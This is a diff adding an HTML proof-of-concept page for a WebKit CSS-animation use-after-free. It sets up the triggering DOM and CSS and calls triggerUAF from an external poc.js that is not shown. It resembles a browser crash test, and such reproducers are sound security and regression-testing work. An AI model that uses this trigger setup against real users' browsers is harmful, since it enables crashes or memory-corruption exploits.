@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BUG ---- </title>
+    <style>
+      @keyframes keyframes {}
+      cite { animation: keyframes 100ms; }
+      button {
+        margin-top: 20px;
+        padding: 10px;
+        font-size: 16px;
+      }
+    </style>
+</head>
+<body>
+    <h1>CVE WebKit CSS Animation UAF</h1>
+    <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
+    <button id="button">Trigger </button>
+    <object type="image/png">
+        <cite></cite>
+        <dl hidden></dl>
+    </object>
+    <p>PASS if this test doesn't crash</p>
+    <script type="module">
+        import { triggerUAF } from './poc.js';
+        document.getElementById('button').addEventListener('click', () => {
+            try {
+                triggerUAF();
+            } catch (e) {
+                alert('Error: ' + e.message);
+            }
+        });
+    </script>
+</body>
+</html>
